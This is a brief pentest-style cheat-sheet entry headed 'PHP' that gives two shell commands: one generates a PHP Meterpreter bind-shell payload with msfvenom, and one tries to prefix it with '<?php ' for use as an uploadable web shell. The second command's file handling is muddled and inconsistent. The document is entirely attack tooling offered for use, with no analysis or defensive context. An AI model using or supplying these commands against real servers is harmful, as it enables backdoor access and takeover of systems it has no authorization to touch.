# PHP

`$ msfvenom -p php/meterpreter/bind_tcp lport=<PORT> -f raw > met.php`

`$ cat met.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> met.php`